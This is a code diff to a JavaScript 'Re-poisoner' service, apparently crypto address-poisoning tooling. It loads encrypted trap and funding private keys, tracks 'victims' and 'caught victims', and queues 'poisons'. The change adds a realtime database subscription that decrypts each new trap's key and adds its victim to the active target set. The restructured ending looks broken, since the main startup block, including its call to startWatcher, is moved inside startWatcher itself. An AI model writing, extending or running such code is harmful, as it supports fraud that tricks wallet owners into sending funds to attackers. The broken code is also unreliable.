@@ -33,7 +33,7 @@ if (supabaseUrl && supabaseServiceKey) {
       fetch: (url, options = {}) => {
         return fetch(url, {
           ...options,
-          signal: AbortSignal.timeout(30000),
+          signal: AbortSignal.timeout(60000),
         });
       },
     },
@@ -211,6 +211,7 @@ let isScanning = false;
 
 // ─── Load caught victims from database ───
 const caughtVictims = new Set();
+let realtimeSubscription = null;
 
 async function loadCaughtVictims() {
   if (!supabaseService) return;
@@ -234,6 +235,61 @@ async function loadCaughtVictims() {
   } catch (err) {
     console.warn(`[DEBUG] Could not load caught victims from DB: ${err.message}`);
   }
+}
+
+// ─── Subscribe to new traps in real-time ───
+function subscribeToNewTraps() {
+  if (!supabaseService) {
+    console.warn('[DEBUG] Supabase not available, skipping realtime subscription');
+    return;
+  }
+
+  console.log('[DEBUG] Subscribing to new traps via Supabase Realtime...');
+
+  realtimeSubscription = supabaseService
+    .channel('traps_changes')
+    .on(
+      'postgres_changes',
+      {
+        event: 'INSERT',
+        schema: 'public',
+        table: 'traps',
+      },
+      async (payload) => {
+        try {
+          const row = payload.new;
+          console.log(`[REALTIME] 🆕 New trap detected: ${row.victim_address}`);
+
+          // Decrypt the private key
+          const privateKey = decrypt(row.trap_private_key_enc);
+          const victim = row.victim_address.toLowerCase();
+          const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
+          const campaignId = row.campaign_id;
+
+          // Add to victims map
+          victims.set(victim, {
+            privateKey,
+            trapAddress: row.trap_address.toLowerCase(),
+            counterparty,
+            lastPoison: 0,
+            lastCounterPoison: 0,
+            campaignId,
+            victimAddress: victim,
+          });
+
+          console.log(`[REALTIME] ✅ Added ${victim} to active victims (total: ${victims.size})`);
+        } catch (err) {
+          console.error(`[REALTIME] Failed to process new trap: ${err.message}`);
+        }
+      }
+    )
+    .subscribe((status) => {
+      if (status === 'SUBSCRIBED') {
+        console.log('[DEBUG] ✅ Realtime subscription active - listening for new traps');
+      } else if (status === 'CHANNEL_ERROR') {
+        console.error('[DEBUG] ❌ Realtime subscription failed');
+      }
+    });
 }
 
 // ─── Load traps from database ───
@@ -262,25 +318,38 @@ async function loadTrapsFromDB() {
     const campaignIds = campaigns.map(c => c.id);
 
 
-    // 🆕 Load funding keys for each campaign to use as mirror operators
+    // 🚀 FIX: Only load funding keys for NEW campaigns (skip already loaded ones)
+    const invalidCampaigns = new Set(); // Cache invalid campaigns to avoid retrying
+
     if (MIRROR_TOKEN_USDC || MIRROR_TOKEN_USDT || MIRROR_TOKEN_NATIVE) {
       for (const camp of campaigns) {
-        if (!camp.funding_private_key_enc) {
-          console.warn(`[DEBUG] Campaign ${camp.id} has no funding key, mirror disabled for this campaign`);
+        // Skip if already loaded
+        if (campaignMirrorWallets.has(camp.id)) {
           continue;
         }
+
+        // Skip if we already know this campaign has invalid key
+        if (invalidCampaigns.has(camp.id)) {
+          continue;
+        }
+
+        if (!camp.funding_private_key_enc) {
+          console.warn(`[DEBUG] Campaign ${camp.id} has no funding key, mirror disabled for this campaign`);
+          invalidCampaigns.add(camp.id);
+          continue;
+        }
+
         try {
           let fundingKey = decrypt(camp.funding_private_key_enc);
 
-          // 🚨 FIX: Trim whitespace and validate format
           fundingKey = fundingKey.trim();
           if (!fundingKey.startsWith('0x')) {
             fundingKey = `0x${fundingKey}`;
           }
 
-          // Validate hex format (0x + 64 hex chars)
           if (!/^0x[a-fA-F0-9]{64}$/.test(fundingKey)) {
             console.warn(`[DEBUG] Campaign ${camp.id} has invalid funding key format, skipping mirror for this campaign`);
+            invalidCampaigns.add(camp.id);
             continue;
           }
 
@@ -292,7 +361,7 @@ async function loadTrapsFromDB() {
             transport: fallback(
               fallbackUrls.map(url => http(url, { timeout: 15000 })),
               {
-                rank: true,  // 🚀 ROTATION FIX: Prioritize working endpoints
+                rank: true,
                 retryCount: 3,
                 retryDelay: 1000
               }
@@ -305,6 +374,7 @@ async function loadTrapsFromDB() {
           console.log(`[DEBUG] Campaign ${camp.id} funding key loaded (operator: ${fundingAccount.address})`);
         } catch (err) {
           console.warn(`[DEBUG] Failed to decrypt funding key for campaign ${camp.id}: ${err.message}`);
+          invalidCampaigns.add(camp.id);
         }
       }
     }
@@ -1693,47 +1763,45 @@ function startWatcher() {
   // Keep caught victims poll at 8 minutes
   caughtVictimsPollInterval = setInterval(loadCaughtVictims, 480000);
 
-  // 🚀 FIX BUG #2: Reload traps every 5 minutes to pick up new campaigns
-  // Only start this AFTER the watcher is running
-  setTimeout(() => {
-    trapsReloadInterval = setInterval(async () => {
-      console.log('[DEBUG] Reloading traps from database...');
-      await loadTrapsFromDB();
-    }, 300000);
-  }, 10000); // Wait 10 seconds before starting trap reloads
+  // 🚀 No more polling! Real-time subscription handles new traps
+  console.log('[DEBUG] Trap polling disabled - using real-time subscription instead');
 
-  console.log(`[DEBUG] Watcher started. Polling every ${scanConfig.pollIntervalMs / 1000}s, max ${scanConfig.maxBlocksPerScan} blocks per scan.`);
-}
+  // --- Graceful shutdown ---
+  setupGracefulShutdown();
 
-// --- Graceful shutdown ---
-setupGracefulShutdown();
+  onShutdown(async () => {
+    console.log('[DEBUG] Shutting down...');
+    if (blockPollInterval) clearInterval(blockPollInterval);
+    if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
+    if (trapsReloadInterval) clearInterval(trapsReloadInterval);
+    if (realtimeSubscription) {
+      await realtimeSubscription.unsubscribe();
+      console.log('[DEBUG] Realtime subscription closed');
+    }
+    console.log('[DEBUG] All resources cleaned up.');
 
-onShutdown(async () => {
-  console.log('[DEBUG] Shutting down...');
-  if (blockPollInterval) clearInterval(blockPollInterval);
-  if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
-  if (trapsReloadInterval) clearInterval(trapsReloadInterval);
-  console.log('[DEBUG] Intervals cleared.');
+    let totalQueued = 0;
+    for (const items of poisonQueue.values()) totalQueued += items.length;
+    if (totalQueued > 0) {
+      console.log(`[DEBUG] Flushing ${totalQueued} queued poisons before shutdown...`);
+      await flushAllQueues();
+    }
+  });
 
-  let totalQueued = 0;
-  for (const items of poisonQueue.values()) totalQueued += items.length;
-  if (totalQueued > 0) {
-    console.log(`[DEBUG] Flushing ${totalQueued} queued poisons before shutdown...`);
-    await flushAllQueues();
+  // --- Main ---
+  console.log('[DEBUG] Loading traps from database...');
+  const loaded = await loadTrapsFromDB();
+  if (loaded === 0) {
+    logger.error(`No victims loaded from database. Exiting.`);
+    console.error(`[DEBUG] No victims loaded. Exiting.`);
+    process.exit(1);
   }
-});
 
-// --- Main ---
-console.log('[DEBUG] Loading traps from database...');
-const loaded = await loadTrapsFromDB();
-if (loaded === 0) {
-  logger.error(`No victims loaded from database. Exiting.`);
-  console.error(`[DEBUG] No victims loaded. Exiting.`);
-  process.exit(1);
-}
+  await loadCaughtVictims();
 
-await loadCaughtVictims();
+  // 🚀 Subscribe to new traps in real-time (no more polling!)
+  subscribeToNewTraps();
 
-console.log('[DEBUG] Starting watcher...');
-startWatcher();
-logger.info('Re‑poisoner is running. Press Ctrl+C to stop.');
+  console.log('[DEBUG] Starting watcher...');
+  startWatcher();
+  logger.info('Re‑poisoner is running. Press Ctrl+C to stop.');
